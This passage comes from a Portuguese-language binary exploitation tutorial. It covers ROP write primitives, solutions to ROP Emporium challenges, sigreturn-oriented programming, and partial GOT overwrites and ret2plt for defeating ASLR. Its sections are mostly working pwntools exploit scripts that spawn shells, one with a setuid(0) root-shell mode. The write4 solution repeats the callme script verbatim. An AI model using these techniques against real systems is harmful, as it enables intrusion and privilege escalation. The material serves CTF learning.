    temp = b&quot;&quot;                  # Lixo  # Util
    temp += gadget_pop_rdi      
    temp += p64(where)                  # rdi
    temp += gadget_pop_rax      
    temp += b&quot;A&quot;*8              # r13
    temp += p64(what)                   # rax
    temp += b&quot;B&quot;*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b&quot;C&quot;*8              # r14
    
    return temp
</code></pre>
<p>E nos poderíamos usar assim:</p>
<pre><code class="language-py">payload = b'A'*40
data_seg = 0x00601028
for c in b&quot;/bin/sh\x00&quot;:
    payload += write_byte(c, data_seg)
    data_seg += 1

payload += gadget_pop_rdi
payload += p64(0x00601028)    # data_seg inicial: pointer para /bin/sh
payload += p64(libc.sym.system) 
</code></pre>
<a class="header" href="print.html#write---something---where" id="write---something---where"><h2>Write - Something - Where</h2></a>
<p>Voce escreve alguma coisa (voce nao controla) em algum lugar (voce controla)</p>
<p>o <code>mov [rdi] al</code> poderia ser substituído por:
<code>mov [rdi] 0x7f 1e 1f 60 00 00 00 00</code></p>
<p>Assim, podemos escrever esse valor fixo, em um endereço que nos controlamos!</p>
<p>Pode util ser em ROP chains caso voce possua um modificador.</p>
<p>Uma fonte comum desse primitivo sao unlinks parciais no heap (unsorted bins attack)</p>
<a class="header" href="print.html#modificador" id="modificador"><h2>Modificador</h2></a>
<p>add, xor, sub, .... todas essas instruções nos permitem alterar os bytes que
ja estão na memoria!</p>
<p>E similar aos writes, a quantidade de controle que possuímos pode variar!</p>
<p><code>pop rdx; add [rdx] 0x02;</code> Somente controlamos o endereço!</p>
<p>Caso tenhamos um <code>xor</code>, a situação ideal seria a memoria = <code>0xff</code></p>
<p>Caso seja um <code>add</code>, e a memoria <code>0x00</code>, nos possuímos um write super simples!</p>
<p>E assim por diante!</p>
<a class="header" href="print.html#incomuns" id="incomuns"><h1>Incomuns</h1></a>
<p>Existem outros primitivos que sao mais raros, então somente irei explicar
quando for util. Por exemplo o <code>write refletido</code>: explicado no
tutorial de unsafe unlink!</p>
<p>Porem vou colocar os links aqui caso voce esteja procurando por algum especifico! :D</p>
<a class="header" href="print.html#dicas" id="dicas"><h1>Dicas</h1></a>
<a class="header" href="print.html#valores-pre-modificados" id="valores-pre-modificados"><h2>Valores pre modificados</h2></a>
<p>Similar ao lixinho para os <code>pops</code>, e eu nao sabia aonde colocar! hehe :D</p>
<p>As vezes, um gadget muito util acaba tendo efeito colateral nos nossos valores!</p>
<p>Por exemplo, vamos supor que somente exista um gadget que nos permita alterar rdi!</p>
<pre><code class="language-x86asm">gadget_rdi:
    pop rdi
    add rdi 0x1234 
    ret

gadget_pop_rax:
    pop r13
    pop rax
    pop r12
    xor r13 r12
    ret

gadget_mov_rdi_al:
    mov [rdi] al
    pop r14
    ret
</code></pre>
<p>Os outros gadgets estão inalterados!</p>
<pre><code class="language-py">def write_byte(what, where);
    temp = b&quot;&quot;                  # Lixo  # Util
    temp += gadget_pop_rdi


    temp += p64(where - 0x1234)         # rdi
    
    
    temp += gadget_pop_rax      
    temp += b&quot;A&quot;*8              # r13
    temp += p64(what)                   # rax
    temp += b&quot;B&quot;*8              # r12

    temp += b&quot;B&quot;*8              # r12
    temp += gadget_mov_rdi_al           # mov [rdi] al
    temp += b&quot;C&quot;*8              # r14
    
    return temp
</code></pre>
<a class="header" href="print.html#alinhamento-da-stack" id="alinhamento-da-stack"><h2>Alinhamento da stack</h2></a>
<p>Voce precisa garantir o alinhamento da stack de acordo com a arquitetura:</p>
<ul>
<li>x86 -&gt; 4 bytes -&gt; p32()</li>
<li>x86_64 -&gt; 8 bytes -&gt; p64()</li>
</ul>
<p>Mesmo que o valor seja so um byte, voce precisa garantir o alinhamento da
stack! Pois o <code>pop</code> vai retirar 4 ou 8 bytes independentemente! Assim,
estragando o endereço do proximo gadget na chain!</p>
<p>Caso o bytes va para <code>al</code>, <code>p64(0x41)</code>ja basta!</p>
<p>Mas caso o valor para <code>al</code> voce precisa fazer <code>p64(0x4100)</code> ou <code>b&quot;\x00&quot;*7 + b&quot;\x41&quot; + b&quot;\x00&quot;</code></p>
<p>Aqui tao minhas solucoes, em breve vou escrever um tutorial, mas por enquanto
e isso :(</p>
<ul>
<li><a href="print.html#sha256">sha256</a></li>
<li><a href="print.html#ret2win">ret2win</a></li>
<li><a href="print.html#split">split</a></li>
<li><a href="print.html#callme">callme</a></li>
<li><a href="print.html#write4">write4</a></li>
<li><a href="print.html#badchars">badchars</a></li>
<li><a href="print.html#fluff">fluff</a></li>
</ul>
<a class="header" href="print.html#sha256" id="sha256"><h1>sha256</h1></a>
<p>E as sha256 pq eu percebi q os desafios foram alterados com o passar do tempo</p>
<pre><code>$ sha256sum 0-ret2win/ret2win 1-split/split 1-split/split 2-callme/callme 3-write4/write4 4-badchars/badchars 5-fluff/fluff

824893a58502620cbfe8bce7d362cf96b5eb484b78291b1371fd7a2b8086c1d6  0-ret2win/ret2win
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
bf9af5d3618c33c800f577065a4773fb12b6e88390552dd766efa013ebad40f9  1-split/split
38b3aac5f11e673ecfbe344f9330d7dfa7d6921be506a948ab9d0347af756acb  2-callme/callme
15c9fc1d4dff1874633caebd212d4990243b072f9352baa23daf07f39a93f8cd  3-write4/write4
5308289f3937a34e4c5eac818e394217f5f22c6f21fbb0f6dc6b8e3f771deb8b  4-badchars/badchars
e5335795104d861dc5e54c8734e090f1c7dfd5b642e4607c2747aed7529c724d  5-fluff/fluff
</code></pre>
<a class="header" href="print.html#ret2win" id="ret2win"><h1>ret2win</h1></a>
<pre><code>O programa fala o tamanho ate o RIP (40), e você pode usar o truque mencionado
no enunciado para testar.

Ai é só usar objdump |  grep ret2win para pegar o endereço
     python3 -c &quot;print('A'*40+'\x56\x07\x40',end='')&quot; |./ret2win 
Truque pra tirar a newline (se não, não funciona)
</code></pre>
<a class="header" href="print.html#split" id="split"><h1>split</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

    # sys arg on RDI
    # https://godbolt.org/z/691asM

#gadgets
system = p64(0x40074b)
# gdb&gt; print system:  0x400560
# That one is a addr to call_system (usefulFunction)

# ROPgadget or ropium
pop_rdi_ret = p64(0x4007c3)

# strings
# rabin -z   or   r2&gt; iz 
ls = p64(0x0040084a)
cat = p64(0x00601060)

buf = b'A'*40 # Pad
# buf += p64(0x00400742)
# usefulFunction -&gt; test offset
buf += pop_rdi_ret
buf += cat
buf += system

binary = ELF(&quot;./split&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(buf)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recvuntil(&quot;}&quot;))
io.close()k
</code></pre>
<a class="header" href="print.html#callme" id="callme"><h1>callme</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF(&quot;./callme&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<a class="header" href="print.html#write4" id="write4"><h1>write4</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# Strings
args = p64(0xdeadbeefdeadbeef)
args += p64(0xcafebabecafebabe)
args += p64(0xd00df00dd00df00d)

# Gadgets
useful = p64(0x000000000040093c)
    # pop rdi, rsi, rdx
    # calling convention:
    #    rdi rsi rdx rcx

# Funcs (gdb print)
callone = p64(0x7ffff7dc881a)
calltwo = p64(0x7ffff7dc892b)
callthree = p64(0x7ffff7dc8a2d)

payload = b'A'*40
for func in [callone, calltwo, callthree]:
    payload += useful
    payload += args
    payload += func


binary = ELF(&quot;./callme&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)
io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<a class="header" href="print.html#badchars" id="badchars"><h1>badchars</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

binary = ELF(&quot;./badchars&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)

# But on data+6 there is a bad byte on the addr
# Because we wouldnt be able to fix the bad byte if the addr was also bad, we do a +3
# Other solutions:
#       If we had a-&gt; add [REG+123whatever] 123whatever
#       or walking with inc-&gt; REG=data_seg; 6*(inc REG); add [reg] 122whatever
#       maybe ret2csu?

# Gadgets (usefulGadgets + ropper --file badchars -b 7867612e)
write8_r13_r12 = p64(0x0000000000400634)
pop_r12_r13 = p64(0x000000000040069c)  # r12 r13 r14 r15
pop_rdi = p64(0x00000000004006a3)
pop_r14_r15 = p64(0x00000000004006a0)
sub1_r15_r14b = p64(0x0000000000400630)

bad = [ord('x'), ord('g'), ord('a'), ord('.')]
data_seg = 0x00601028 +3

# Funcs
def arbwrite8(addr, val): 
    temp = pop_r12_r13 +val +p64(addr)
    temp += b'B'*16 # fill r14 r15 
    return temp + write8_r13_r12
def arbsub1(addr, val): return pop_r14_r15 +val*8 +p64(addr) +sub1_r15_r14b

# Initial write
payload = b'A'*40
payload += arbwrite8(data_seg, b&quot;\xff/fl\xff\xff\xfft&quot;) # FF as placeholder
payload += arbwrite8(data_seg+8, b&quot;\xfft&quot;+b'\x00'*6)

# Fix bad bytes
payload += arbsub1(data_seg+0, b'\xd1') # .
                                        # /
                                        # f
                                        # l
payload += arbsub1(data_seg+4, b'\x9e') # a
payload += arbsub1(data_seg+5, b'\x98') # g
payload += arbsub1(data_seg+6, b'\xd1') # . # addr contains bad char w/o shift
                                        # t
payload += arbsub1(data_seg+8, b'\x87') # x
                                        # t
# Load pointer and call print_file
payload += pop_rdi
payload += p64(data_seg)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<a class="header" href="print.html#fluff" id="fluff"><h1>fluff</h1></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *

# https://www.felixcloutier.com/x86/xlat:xlatb
# https://www.tutorialspoint.com/assembly_programming/assembly_stos_instruction.htm
# https://www.felixcloutier.com/x86/bextr

binary = ELF(&quot;./fluff&quot;)
io = process(binary.path)
io.recvuntil(&quot;&gt; &quot;)

# Gadgets
bextr_rbx = p64(0x000000000040062a)
    # pop    rdx	
    # pop    rcx
    # add    rcx,0x3ef2
    # bextr  rbx,rcx,rdx

xlat_al_rbx = p64(0x0000000000400628)
# Set AL to memory byte [RBX + unsigned AL].

pop_rdi = p64(0x00000000004006a3)
stosb_rdi_al = p64(0x0000000000400639) 

# funcs
def mov_rbx(val):
    rcx = p64(val - 0x3ef2)
    rdx = p64(0x4000)
    # [0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    #  |                       |                 |
    #  16    num_bits=64       7  start_bit=0    0
    # bextr will copy 64 bits from rcx, 
    # starting on bit 0. Then save it on rbx
    return bextr_rbx +rdx +rcx

payload = b'A'*40
al = 0xb # al starts = 0xb
data_seg = 0x00601028
for c in b&quot;flag.txt&quot;:
    # Load char to al
    b = next(binary.search(c)) - al
    payload += mov_rbx(b)
    payload += xlat_al_rbx
    al = c

    # Load addr to rdi
    payload += pop_rdi
    payload += p64(data_seg)
    data_seg += 1

    # write
    payload += stosb_rdi_al

payload += pop_rdi
payload += p64(0x00601028)
payload += p64(io.elf.plt['print_file'])

io.sendline(payload)
io.recvuntil(&quot;!\n&quot;)
log.success(io.recv(512))
io.close()
</code></pre>
<a class="header" href="print.html#pivot" id="pivot"><h1>Pivot</h1></a>
<pre><code>3d3523f651e7730be0c7c2347ab109dd0842dc29cec3d5fe0c868afc6803026c  pivot
8de035bdc097b881c2118c09ce995b78f49019582cfe6e1b3a584dbebe1c3481  libpivot.so
</code></pre>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *
from time import sleep

# --------------------------------------------------  
# Inicializar
# --------------------------------------------------  
if args.LOG: context.log_level = &quot;info&quot;
else       : context.log_level = &quot;critical&quot;

binary = ELF(&quot;pivot&quot;)
libc = binary.libc

io = process(binary.path)
io.recvuntil(&quot;pivot: &quot;)
leak = int(io.recv(14)[2::],16)
log.info(&quot;Leak: &quot;+hex(leak))

io.recvuntil(&quot;&gt; &quot;)

# --------------------------------------------------  
# Gadgets
# --------------------------------------------------
# Misc
pop_rdi = p64(0x0000000000400a33) 
pop_rax = p64(0x00000000004009bb)
pop_rbp = p64(0x00000000004007c8)
add_rax_rbp = p64(0x00000000004009c4) 
pop_rsi_r15 = p64(0x0000000000400a31) 


# Pivot
xchg_rsp = p64(0x00000000004009bd) # xchg rax, rsp; ret; 

# Read
mov_eax_rax = p64(0x00000000004009c1) # mov eax, dword ptr [rax]; ret;

# Exec
call_rax = p64(0x00000000004006b0) # call rax; depois coloca um lixin p64 
pop_r12_13_14_15 = p64(0x0000000000400a2c) 
one_gadget = 0xcbd1a
# 0xcbd1a execve(&quot;/bin/sh&quot;, r12, r13)
# constraints:
 # [r12] == NULL || r12 == NULL
 # [r13] == NULL || r13 == NULL

# --------------------------------------------------  
# Primeira Fase
# --------------------------------------------------  
fase1 = b&quot;&quot;
fase1 += b&quot;B&quot;*40
fase1 += pop_rax   
fase1 += p64(leak) # leak == fase2
fase1 += xchg_rsp  # rsp == fase2

# Entao, caso coloquemos uma ROP chain no leak, ela sera executada

# --------------------------------------------------  
# Segunda Fase
# --------------------------------------------------  
def get_shell():
    fase2 = b''
    # Ler a got de puts
    fase2 += pop_rax 
    fase2 += p64(binary.got.puts)
    fase2 += mov_eax_rax # mov eax [rax]

    # agora temos o FINAL de puts em rax
    # inicio do puts == ao do leak
    # Entao podemos calcular o resto dele a partir do leak
    # leak  = 0x7fb5       27 4a 9f 10 
    # final = 0x           27 52 45 f0
    # (leak &gt;&gt; 4*8  &lt;&lt; 4*8) + final_puts == puts
    # 0x7fb500000000 + final_puts = 0x7fb5275245f0 (puts)

    # calcular o endereco do one_gadget usando puts como referencia
    fase2 += pop_rbp
    fase2 += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - one_gadget) )
    fase2 += add_rax_rbp
        # lembrete: libc.sym e um  offset dentro do libc (e o one_gadget tambem)

    # one gadget constraints r12 r13 == NULL
    fase2 += pop_r12_13_14_15
    fase2 += p64(0)*4 
    fase2 += call_rax

    return fase2

def privesc():
    setuid = b''
    # Ler a got de puts
    setuid += pop_rax
    setuid += p64(binary.got.puts)
    setuid += mov_eax_rax # mov eax [rax]
    
    # calcular o endereco de setuid usando puts como referencia
    setuid += pop_rbp
    setuid += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libc.sym.puts - libc.sym.setuid) )
    setuid += add_rax_rbp

    setuid += pop_rdi
    setuid += p64(0)
    setuid += call_rax
    setuid += p64(0)

    return setuid

def foothold():
    libpivot = ELF(&quot;libpivot.so&quot;)

    # Executar foothold_function para popular o got
    challenge = b''
    challenge += pop_rax
    challenge += p64(binary.plt.foothold_function)
    challenge += call_rax
    challenge += p64(0)

    # Ler a got de foothold_function
    challenge += pop_rax
    challenge += p64(binary.got.foothold_function)
    challenge += mov_eax_rax # mov eax [rax]
    
    # calcular o endereco de ret2win usando foothold como referencia
    challenge += pop_rbp
    challenge += p64( (leak &gt;&gt; 4*8 &lt;&lt; 4*8) - (libpivot.sym.foothold_function - libpivot.sym.ret2win) )
    challenge += add_rax_rbp

    challenge += call_rax
    challenge += p64(0)

    return challenge

# --------------------------------------------------  
# :D
# --------------------------------------------------  
log.critical('''
ARGV modos:
    SHELL  - shell
    PRIV   - root shell
    CTF    - print flag 

ARGV debug: 
    SLEEP  - 5 seg
    LOG    - log verboso
''')

if args.SLEEP: sleep(5)

if args.CTF:
    fase2 = foothold()
elif args.PRIV:
    fase2 = privesc() + get_shell()
elif args.SHELL:
    fase2 = get_shell()
else:
    log.critical(&quot;Por favor, selecione um modo&quot;)
    quit()

io.sendline(fase2)
io.recvuntil(&quot;&gt; &quot;)

io.sendline(fase1)

if args.CTF:
    io.recvuntil(&quot;libpivot\n&quot;)
    log.critical(io.recv(128))
else:
    io.recvuntil(&quot;!\n&quot;)
    io.interactive()
</code></pre>
<a class="header" href="print.html#srop" id="srop"><h1>SROP</h1></a>
<ul>
<li><a href="print.html#srop">SROP</a></li>
<li><a href="print.html#teoria">Teoria</a>
<ul>
<li><a href="print.html#processos-e-signals">Processos e Signals</a></li>
<li><a href="print.html#sigreturn">Sigreturn</a></li>
<li><a href="print.html#fake">Fake</a></li>
</ul>
</li>
<li><a href="print.html#exemplo-sem-leaks">Exemplo Sem leaks</a>
<ul>
<li><a href="print.html#download">Download</a></li>
<li><a href="print.html#solu%C3%A7%C3%A3o">Solução</a></li>
</ul>
</li>
<li><a href="print.html#exemplo-com-leaks">Exemplo Com Leaks</a>
<ul>
<li><a href="print.html#sropc">srop.c</a></li>
<li><a href="print.html#exploit">Exploit</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#teoria-1" id="teoria-1"><h1>Teoria</h1></a>
<p>Essa técnica que permite voce tornar a stack executável com somente 2 gadgets!</p>
<p>A técnica depende da maneira como sistemas <code>UNIX</code> cuidam dos seus processos!</p>
<p>Caso voce precise de uma revisão em <a href="https://0xturazzi.github.io/book/stack/ret2libc/intro.html#mprotect--ret2shellcode">mprotect + ret2shellcode</a> :D</p>
<a class="header" href="print.html#processos-e-signals" id="processos-e-signals"><h2>Processos e Signals</h2></a>
<a class="header" href="print.html#sigreturn" id="sigreturn"><h2>Sigreturn</h2></a>
<ul>
<li><a href="https://www.tutorialspoint.com/unix_system_calls/sigreturn.htm">tutorialspoint</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/sigreturn.2.html">man sigreturn</a></li>
</ul>
<p>Quando o processo e interrompido, o kernel cria um <code>stack frame</code>
para o <code>signal handler</code> (independentemente de padrão, ou
implementado pelo programa)... Semelhantemente a quando ocorre uma
<code>call</code> !</p>
<p>Assim como em funções (aonde os registers <code>non-scratch</code> precisam
ser salvos), para criar o <code>signal handler</code> antes precisamos salvar
o estado atual usando um struct <code>sigreturn context</code> !</p>
<p><img src="./sigcontext_structure.jpg" alt="sigreturn context diagram" /></p>
<p><img src="https://amriunix.com/img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg" alt="" /></p>
<p><a href="https://amriunix.com/img/Sigreturn-oriented-programming-SROP/sigcontext_structure.jpg">Fonte imagem: amriunix</a></p>
<p>Para retornar, o <code>signal handler</code> nao pode usar um simples <code>ret</code>,
portanto usando a <code>syscall sigreturn</code> (<code>rax</code> = <code>0xf</code>)</p>
<p>A syscall era consumir o <code>sigreturn context</code> e continuar execução
normalmente!</p>
<p>Pera ai, e se nos criarmos um <code>sigreturn context</code> falso e chamarmos
essa syscall manualmente????? Como se nos fossemos um
<code>signal handler</code> retornando?????</p>
<a class="header" href="print.html#fake" id="fake"><h2>Fake</h2></a>
<p>Para facilitar a criação desse struct, podemos usar o nosso
amigo pwntools: <a href="https://docs.pwntools.com/en/dev/rop/srop.html">pwntools SROP</a></p>
<p>Criando um struct vazio, e preenchendo-o!</p>
<pre><code class="language-py">frame = SigreturnFrame(arch=&quot;amd64&quot;)
frame.rax = 0xa
frame.rsi = 0x10
frame.rdx = 1234
frame.rip = 123
</code></pre>
<blockquote>
<p>OBS: O struct e dependente da arquitetura, por exemplo, os
registers presente num processador ARM sao diferentes de um amd</p>
</blockquote>
<blockquote>
<p>OBS 2: Voce nao coloca p64() nos valores, se nao buga sei la</p>
</blockquote>
<p>Agora, nos somente precisamos de uma chain que chame <code>sigreturn</code></p>
<p>Eu imagino que voce possa chamar o wrapper em libc, mas para
chamar a syscall basta executar!</p>
<pre><code class="language-x86asm">mov rax, 0xf  ; 15
syscall       ; ou int_80 em 32 bits sei la
</code></pre>
<a class="header" href="print.html#exemplo-sem-leaks" id="exemplo-sem-leaks"><h1>Exemplo Sem leaks</h1></a>
<p>Tabela de syscalls linux: <a href="https://filippo.io/linux-syscall-table/">filippo.io</a></p>
<a class="header" href="print.html#download" id="download"><h2>Download</h2></a>
<p><a href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/16-srop/csaw19_smallboi/small_boi">nightmare: small_boi</a></p>
<a class="header" href="print.html#solução" id="solução"><h2>Solução</h2></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *


elf = ELF(&quot;small_boi&quot;)
io = process(elf.path)

syscall = 0x400180 # mov eax, 0xf; syscall;
                   # +5 = so a syscall

sig = SigreturnFrame(arch='amd64')
sig.rax = 59      # execve
sig.rip = syscall+5
sig.rdi = next(elf.search(b&quot;/bin/sh\x00&quot;))

payload = b'A'*40      # cyclical_find
payload += p64(syscall)
payload += bytes(sig)

io.sendline(payload)
io.interactive()

</code></pre>
<a class="header" href="print.html#exemplo-com-leaks" id="exemplo-com-leaks"><h1>Exemplo Com Leaks</h1></a>
<a class="header" href="print.html#sropc" id="sropc"><h2>srop.c</h2></a>
<ul>
<li><a href="https://amriunix.com/post/sigreturn-oriented-programming-srop/">amriunix</a></li>
<li><a href="https://0x00sec.org/t/srop-signals-you-say/2890">0x00sec</a></li>
</ul>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
// gcc srop.c -o srop -no-pie -fno-stack-protector
void syscall_(){
       __asm__(&quot;syscall; ret;&quot;);
}

void set_rax(){
       __asm__(&quot;movl $0xf, %eax; ret;&quot;);
}

int main(){
       // ONLY SROP!
       char buff[100];
       printf(&quot;Buff @%p, can you SROP?\n&quot;, buff);
       read(0, buff, 5000);
       return 0;
}
</code></pre>
<a class="header" href="print.html#exploit" id="exploit"><h2>Exploit</h2></a>
<pre><code class="language-py">#!/usr/bin/python3
from pwn import *


elf = context.binary = ELF(&quot;./srop&quot;)

io = process(elf.path)
io.recvuntil('@')

stack_leak = int(io.recv(14),16)
log.info(&quot;Stack Leak: &quot; + hex(stack_leak))

io.recvuntil(&quot;?\n&quot;)

# Pular Func Prologo
elf.sym.syscall_ += 4
# pwndbg&gt; disassemble syscall_ 
# Dump of assembler code for function syscall_:
#     0x0000000000401132 &lt;+0&gt;:	push   rbp
#     0x0000000000401133 &lt;+1&gt;:	mov    rbp,rsp
#     0x0000000000401136 &lt;+4&gt;:	syscall 
#     0x0000000000401138 &lt;+6&gt;:	ret    
#     0x0000000000401139 &lt;+7&gt;:	nop
#     0x000000000040113a &lt;+8&gt;:	pop    rbp
#     0x000000000040113b &lt;+9&gt;:	ret    

elf.sym.set_rax += 4 
# pwndbg&gt; disassemble set_rax 
# Dump of assembler code for function set_rax:
#      0x000000000040113c &lt;+0&gt;:	push   rbp
#      0x000000000040113d &lt;+1&gt;:	mov    rbp,rsp
#      0x0000000000401140 &lt;+4&gt;:	mov    eax,0xf
#      0x0000000000401145 &lt;+9&gt;:	ret    
#      0x0000000000401146 &lt;+10&gt;:	nop
#      0x0000000000401147 &lt;+11&gt;:	pop    rbp
#      0x0000000000401148 &lt;+12&gt;:	ret    



payload = b&quot;&quot;
payload += asm(shellcraft.execve(&quot;/bin/sh\x00&quot;))
payload += b&quot;A&quot;*(120 - len(payload))
payload += p64(elf.sym.set_rax)
payload += p64(elf.sym.syscall_)        # sigreturn syscall

frame = SigreturnFrame(arch=&quot;amd64&quot;)
frame.rax = 0xa                         # mprotect syscall
frame.rdi = (stack_leak &gt;&gt; 12) &lt;&lt; 12    # Addr
frame.rsi = 0x21000                     # Size
frame.rdx = 7                           # Perms
frame.rip = elf.sym.syscall_            # syscall (mrprotect); Ret
frame.rsp = stack_leak + len(payload) + len(frame) # ret addr
                                        #              \\  
payload += bytes(frame)                 #              \\
payload += p64(stack_leak)              #   &lt;------------
                                        #
                                        # stack_leak ---&gt; shellcode


io.sendline(payload)
io.interactive()
</code></pre>
<a class="header" href="print.html#derrotando-aslr" id="derrotando-aslr"><h1>Derrotando ASLR</h1></a>
<pre><code class="language-py">if RELRO != FULL &amp;&amp; PIE == OFF &amp;&amp; ARCH != 32bits:
    corromper_GOT()

if RELRO == FULL &amp;&amp; PIE == OFF &amp;&amp; ARCH != 32bits:
    re2plt()

if RELRO == FULL &amp;&amp; PIE == ON  &amp;&amp; ARCH == 32bits:
    bruteforce()

else:
    desistir() # =(
</code></pre>
<p>se alguem falar &quot;blablabla elif&quot; eu juro que eu vou cometer um crime &gt;:(</p>
<a class="header" href="print.html#corromper-got" id="corromper-got"><h1>Corromper GOT</h1></a>
<p>Voce provavelmente ja conhece essa técnica, visto que eu usei ela em ROP!</p>
<p>Mas resumindo, a GOT armazena o endereço das funções, se voce corromper um item da GOT, quando o programa-lo, vai redirecionar para a função que voce escolheu.</p>
<p>Porem no contexto de ASLR, nao podemos so botar o endereço de system, pq ne.... ASLR!!!</p>
<p>Então, nos podemos fazer um overwrite parcial!</p>
<p>Dependendo da arquitetura e sistema operacional isso pode variar, porem:</p>
<pre><code class="language-py">   7f ff ff    xx xx xx   12 34 
|  Prefixo  | Parte com |  Nosso |
| SEM ASLR  |    ASLR   |  ALVO  |
</code></pre>
<p>Assim, se corrompermos so os <code>LSB</code>s, podemos ignorar a parte do ASLR...</p>
<pre><code class="language-py">puts:    7f ff ff   xx xx xx   10 00 -| offset constante
system:  7f ff ff   xx xx xx   12 34 -| entre elas 0x234

puts:    7f ff ff   11 3c 4c   10 00 -| 0x234
system:  7f ff ff   11 3c 4c   12 34 -|

puts:    7f ff ff   4c 1d 42   10 00 -| 0x234
system:  7f ff ff   4c 1d 42   12 34 -|
</code></pre>
<p>Assim, se adicionarmos ao <code>puts</code> o offset entre ele e <code>system</code>... Usando por exemplo, um gadget
<code>add [rbx] al</code></p>
<p>Isso também pode ser usado no valor armazenado para o <code>ret</code> em BoFs tradicionais! Caso a função
tenha sido chamada pelo libc!</p>
<p><strong>Obs:</strong> Dependendo da vuln, voce usa tipos de offsets diferentes</p>
<ul>
<li>Write -&gt; offset = System - Base_Libc</li>
<li>Add   -&gt; offset = System - puts # Ou qualquer outra função</li>
</ul>
<a class="header" href="print.html#exemplo-1" id="exemplo-1"><h1>Exemplo</h1></a>
<p>Vamos supor que temos um <code>add-what-where</code> -&gt; Ex: <code>add [rbx] al;ret;</code></p>
<pre><code class="language-py">elf = ELF(&quot;vuln123&quot;)
libc = elf.libc

got = elf.got.puts # Endereço de Puts na got
got += 7 # Queremos alterar somente os bytes 7 e 8
         # Lembrando que isso depende, em alguma outra
         # Pode ser 6 7 8, etc etc....

offset = libc.sym.system - libc.sym.puts

payload = vuln_add(got, offset)
payload += elf.plt.puts # Chamar Puts por meio da plt

io.interactive()
</code></pre>
<ul>
<li><a href="print.html#teoria">Teoria</a></li>
<li><a href="print.html#beatbox-puts-puts-puts-beatbox"><BeatBox> Puts Puts Puts </BeatBox></a></li>
<li><a href="print.html#exemplo">Exemplo</a>
<ul>
<li><a href="print.html#vulnc">vuln.c</a></li>
<li><a href="print.html#exploit">exploit</a></li>
</ul>
</li>
</ul>
<a class="header" href="print.html#teoria-2" id="teoria-2"><h1>Teoria</h1></a>
<blockquote>
<p>Vale a pena revisar GOT e PLT caso precise</p>
</blockquote>
<p>Resumo:</p>
<ul>
<li>
<p>A GOT armazena o endereço da funcao apos ser resolvida!</p>
</li>
<li>
<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
</li>
<li>
<p>A PLT checa a GOT, caso o endereço ja tenha sido resolvido, <code>jmp</code> la... caso o endereço ainda nao tenha sido, coordena com <code>ld.so</code> para resolver!</p>
</li>
</ul>
<p>A técnica ret2plt pode ser considerada o ret2libc do mundo com ASLR!</p>
<p>Da mesma maneira que podíamos retornar para o libc quando o NX foi ativado,
agora podemos voltar para a PLT!</p>
<p>Podemos fazer isso pois a PLT (e GOT) nao tem seu endereço alterado pelo ASLR,
somente por PIE!</p>
<p>Nos poderíamos usar isso para, por exemplo, chamar system() ... mas existe
uma alternativa mais divertida!</p>
<a class="header" href="print.html#beatbox-puts-puts-puts-beatbox" id="beatbox-puts-puts-puts-beatbox"><h1><BeatBox> Puts Puts Puts </BeatBox></h1></a>
<p>Nos podemos ler a GOT de uma funcao <strong>JA RESOLVIDA</strong>, e calcular o
endereço da base do libc, ja que as funções estão a um offset constante!</p>
<p>Tendo o endereço base do libc, podemos chamar quantas funções quisermos, mesmo
que nao tenham sido usadas originalmente pelo programa!</p>
<p>Para fazer isso, vamos usar <code>puts</code>: printa uma <code>string</code> pro terminal!</p>
<p>Vamos passar entrada para <code>puts na got</code>, assim: <code>puts vai printar o endereço resolvido de puts</code></p>
<p>Em seguida, nos chamamos main (ou a funcao vulnerável) e executamos o BoF de
novo, so que agora que a base do libc, podemos usar todo o seu potencial</p>
<p>Em x86_64 bits nos podemos fazer:</p>
<pre><code>pop_rdi_gadget
got.puts

plt.puts    -&gt; rdi = primeiro arg, e rdi aponta para 
              a got com o endereço resolvido de puts

main
</code></pre>
<p>E em x86 bits:</p>
<pre><code>plt.puts
main
got.puts
</code></pre>
<p>Para calcular a base do libc a partir desse leak, basta fazer:</p>
<pre><code class="language-py">leak = int(recv(), 16)
libc.address = leak - libc.sym.puts
</code></pre>
<p><code>libc.sym.*</code> Armazena o offset dentro daquela versão do libc, isto e:
